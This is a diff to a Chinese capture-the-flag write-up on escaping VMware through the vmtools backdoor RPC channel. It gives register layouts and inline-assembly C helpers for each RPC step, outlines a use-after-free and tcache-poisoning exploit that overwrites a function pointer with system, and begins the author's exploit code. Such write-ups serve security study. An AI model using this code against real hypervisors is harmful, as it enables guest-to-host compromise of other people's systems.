@@ -3,7 +3,8 @@
 
 ## 前置知识
 在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：
-```cpp=
+
+```cpp
 MOV EAX, 564D5868h                      /* magic number     */
 MOV EBX, command-specific-parameter
 MOV CX,  backdoor-command-number
@@ -11,9 +12,11 @@ MOV DX,  5658h                          /* VMware I/O Port  */
 
 IN  EAX, DX (or OUT DX, EAX)
 ```
+
 首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。
 
 backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：
+
 ```typescript
      +------------------+
      | Open RPC channel |
@@ -44,28 +47,34 @@ backdoor机制所有的命令和调用方法，基本都是首先设置寄存器
      +-------------------+
 
 ```
+
 > 以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：https://sites.google.com/site/chitchatvmback/backdoor
 
 ### Open RPC channel
 > RPC subcommand：00h
 
 调用IN（OUT）前，需要设置的寄存器内容：
-```cpp=
+
+```cpp
 EAX = 564D5868h - magic number
 EBX = 49435052h - RPC open magic number ('RPCI')
 ECX(HI) = 0000h - subcommand number
 ECX(LO) = 001Eh - command number
 EDX(LO) = 5658h - port number
 ```
+
 返回值：
-```cpp=
+
+```cpp
 ECX = 00010000h: success / 00000000h: failure
 EDX(HI) = RPC channel number
 ```
+
 该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（`#0 - #7`）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。
 
 我们可以使用如下函数实现Open RPC channel的过程：
-```CPP=
+
+```CPP
 void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
 	 asm("movl %%eax,%%ebx\n\t"
                 "movq %%rdi,%%r10\n\t"
@@ -87,11 +96,13 @@ void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
         );
 }
 ```
+
 ### Send RPC command length
 > RPC subcommand：01h
 
 调用：
-```CPP=
+
+```CPP
 EAX = 564D5868h - magic number
 EBX = command length (not including the terminating NULL)
 ECX(HI) = 0001h - subcommand number
@@ -99,12 +110,16 @@ ECX(LO) = 001Eh - command number
 EDX(HI) = channel number
 EDX(LO) = 5658h - port number
 ```
+
 返回值：
-```CPP=
+
+```CPP
 ECX = 00810000h: success / 00000000h: failure
 ```
+
 在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：
-```CPP=
+
+```CPP
 void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
 	asm("movl %%eax,%%ebx\n\t"
 		"movq %%r8,%%r10\n\t"
@@ -120,11 +135,13 @@ void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
 	);
 }
 ```
+
 ### Send RPC command data
 > RPC subcommand：02h
 
 调用：
-```CPP=
+
+```CPP
 EAX = 564D5868h - magic number
 EBX = 4 bytes from the command data (the first byte in LSB)
 ECX(HI) = 0002h - subcommand number
@@ -132,19 +149,24 @@ ECX(LO) = 001Eh - command number
 EDX(HI) = channel number
 EDX(LO) = 5658h - port number
 ```
+
 返回值:
-```CPP=
+
+```CPP
 ECX = 000010000h: success / 00000000h: failure
 ```
+
 该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令`machine.id.get`，那么必须要调用4次，分别为：
-```CPP=
+
+```CPP
 EBX set to 6863616Dh ("mach")
 EBX set to 2E656E69h ("ine.")
 EBX set to 672E6469h ("id.g")
 EBX set to 00007465h ("et\x00\x00")
 ```
 ECX会返回是否成功，具体实现如下：
-```CPP=
+
+```CPP
 void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
 	asm("pushq %%rbp\n\t"
                 "movq %%r9,%%r10\n\t"
@@ -174,7 +196,7 @@ void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *dat
 > RPC subcommand：03h
 
 调用：
-```CPP=
+```CPP
 EAX = 564D5868h - magic number
 ECX(HI) = 0003h - subcommand number
 ECX(LO) = 001Eh - command number
@@ -182,12 +204,12 @@ EDX(HI) = channel number
 EDX(LO) = 5658h - port number
 ```
 返回值：
-```CPP=
+```CPP
 EBX = reply length (not including the terminating NULL)
 ECX = 00830000h: success / 00000000h: failure
 ```
 接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中`1`表示`success`,`0`表示`failure`，即使VMware无法识别RPC command，也会返回`0 Unknown command`作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。
-```CPP=
+```CPP
 void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
 	asm("movl %%eax,%%ebx\n\t"
                 "movq %%r8,%%r10\n\t"
@@ -209,7 +231,7 @@ void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int
 > RPC subcommand：04h
 
 调用：
-```CPP=    
+```CPP
 EAX = 564D5868h - magic number
 EBX = reply type from subcommand 03h
 ECX(HI) = 0004h - subcommand number
@@ -218,12 +240,12 @@ EDX(HI) = channel number
 EDX(LO) = 5658h - port number
 ```
 返回：
-```CPP=
+```CPP
 EBX = 4 bytes from the reply data (the first byte in LSB)
 ECX = 00010000h: success / 00000000h: failure
 ```
 和`https://sites.google.com/site/chitchatvmback/backdoor`中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在`Recieve RPC reply length`中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问`machine.id.get`，如果成功的话，会返回`1 <virtual machine id>`，否则为`0 No machine id`。
-```CPP=
+```CPP
 void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
 	asm("pushq %%rbp\n\t"
                 "movq %%r9,%%r10\n\t"
@@ -249,7 +271,7 @@ void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *
 > RPC subcommand：05h
 
 调用：
-```CPP=
+```CPP
 EAX = 564D5868h - magic number
 EBX = reply type from subcommand 03h
 ECX(HI) = 0005h - subcommand number
@@ -258,11 +280,11 @@ EDX(HI) = channel number
 EDX(LO) = 5658h - port number
 ```
 返回：
-```CPP=
+```CPP
 ECX = 00010000h: success / 00000000h: failure
 ```
 和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过`Receive RPC reply data`接收完整个reply数据的话，就会返回failure。
-```CPP=
+```CPP
 void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
 	asm("movl %%eax,%%ebx\n\t"
                 "movq %%rcx,%%r10\n\t"
@@ -282,7 +304,7 @@ void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
 > RPC subcommand：06h
 
 调用：
-```CPP=
+```CPP
 EAX = 564D5868h - magic number
 ECX(HI) = 0006h - subcommand number
 ECX(LO) = 001Eh - command number
@@ -290,11 +312,11 @@ EDX(HI) = channel number
 EDX(LO) = 5658h - port number
 ```
 返回：
-```CPP=
+```CPP
 ECX = 00010000h: success / 00000000h: failure
 ```
 关闭channel。
-```CPP=
+```CPP
 void channel_close(int cookie1,int cookie2,int channel_num,int *res){
 	asm("movl %%eax,%%ebx\n\t"
                 "movq %%rcx,%%r10\n\t"
@@ -323,7 +345,7 @@ void channel_close(int cookie1,int cookie2,int channel_num,int *res){
 
 ![](https://i.ibb.co/ZHVgstf/rwctf2.png)
 
-```CPP=
+```CPP
 void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
         asm("movl %%eax,%%ebx\n\t"
                 "movq %%rcx,%%r10\n\t"
@@ -356,7 +378,7 @@ void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
 有了`leak`的方法，`exploit`的也是类似的了。简单来说就是`UAF`，把`tcache`的`fd`改到`bss`段，然后改函数指针为`system`,最后弹`calculator`
 
 我给作者的exp加上了注释，大家可以参考:
-```cpp=
+```cpp
 #include <stdio.h>
 #include <stdint.h>
 void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
